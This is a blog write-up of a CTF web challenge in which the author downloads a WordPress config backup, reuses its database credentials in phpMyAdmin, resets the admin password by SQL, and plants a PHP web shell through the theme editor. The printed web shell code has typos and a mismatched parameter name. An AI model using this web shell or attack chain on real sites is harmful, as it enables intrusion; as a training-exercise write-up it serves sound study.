---
layout:     post
title:      "Writeup - Capture South Africa"
subtitle:   "Write-Up"
date:       2018-10-01 
author:     "Abhishek S"
permalink: /:title/
category: Boot2Root
---

This is a write-up for the WEB-APP Challenge [Capture South Africa] in Redteamvillage’s CTF event at Defcon TVM 0x02.




Special thanks to my awesome team members of defcon_speakers_0x02 (Sreeram KL & Vishnuprasad PG)

<p>

http://l.xyz was a web application which was running wordpress instance, while doing basic enumeration, i noticed that the wordpress version used was the most latest one, and the first post was something fishy, the first post’s author name was ‘victimcorp’… i was checking for common vulnerablities that were present in wordpress, i checked for vulnerable plugins and stuff, but couldn’t find any and all were latest, i remember reading a POC in which wp-config file was downloadable, so i thought to try that, but i failed, then i tried adding a .bak (i.e: http://l.xyz/wp-config.php.bak) and there was a backup file, and it did download! </p>


<p>Hurray!!!, I’ve checked it and it was the common config file with the configuration & credentials of the database, I’ve got the username and password from there, I checked for the open ports & instances with nmap, and it was pretty surprising that there was no instance related to DB running, I suddenly got an idea, i just went into /phpmyadmin/ and tried the db credentials! hurray! i logged into the phpmyadmin dashboard, i went to the corresponding database and went to the table wp-users, the password for admin there was encrypted, so i got an idea, instead of decrypting that, i just encrypted ‘test123’ into wordpress salted pass, and updated the pass of user ‘victimcorp’ with an sql DML command.  </p>
  
 <p> 
then, i went to /wp-admin/ and logged into the admin account, we all thought that the flag would be inside the admin panel, but it was not there! where was it? suddenly i got an idea to shell the server, i went to themes, and added a .php file with the following code. </p>

<?
<HT.ML>
<BODY>
<FORM METHOD=”GET” NAME=”cmdform” ACTION=””>
<INPUT TYPE=”text” NAME=”linux command”>
<INPUT TYPE=”submit” VALUE=”command”>
</FORM>
<?
if($_GET[‘cmd’]) {
system($_GET[‘cmd’]);
}
?>
</BODY></HTM.L>
  
<p>
and used ls, and some basic commands, and the flag was inside the /www2/ directory in a file called flag.txt
This was a webapp challenge in the redteamvillage’s ctf, and i loved pr3wning it! There were 6 challenges in total, and our team managed to solve 5 of them, and won the 2nd place :)
Thanks for reading, I hope it was a good read!
P.S: I’ve wanted to make a writeup for the other challenges too, but i don’t have much time with me in order to do that :(
Bug Bounty Hunting
  </p>
